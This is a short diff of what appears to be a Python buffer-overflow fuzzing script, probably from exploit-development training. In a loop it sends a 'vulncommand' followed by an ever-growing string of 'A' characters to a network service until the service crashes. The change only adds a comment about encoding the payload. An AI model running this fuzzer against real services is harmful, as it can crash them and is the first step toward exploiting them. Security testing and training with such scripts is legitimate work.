@@ -13,7 +13,7 @@ while True:
 		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		s.connect((address,port))
 
-		s.send((vulncommand + buffer))
+		s.send((vulncommand + buffer)) # May need to use .encode function to send the payload
 		s.close()
 		sleep(1)
 		buffer = buffer + "A"*100
